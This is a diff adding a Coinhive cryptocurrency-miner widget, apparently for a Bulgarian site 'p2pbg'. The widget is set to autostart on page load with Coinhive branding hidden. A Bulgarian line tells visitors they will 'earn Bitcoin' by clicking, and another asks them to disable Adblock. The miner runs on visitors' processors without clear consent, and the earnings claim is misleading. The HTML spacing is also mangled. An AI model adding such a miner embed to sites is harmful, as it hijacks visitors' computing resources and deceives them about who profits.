@@ -1,0 +1,11 @@
+< div class = "coinhive-miner"
+style = "width: 720px; height: 90px"
+data - key = "7ZS9BgEzhFdh9uyEVRhd1L4uR3rlQNgN"
+data - threads = "2"
+data - throttle = "0.5"
+data - autostart = "true"
+data - whitelabel = "true"
+data - graph = "#000000"
+data - user = "Guest"
+data - start = "Помогнете на p2pbg да продължи да съществува и спечелете Bitcoin! Кликнете на този текст!"
+data - action = "#ff0000" > < em > Please disable Adblock! < /em>                                        </div >
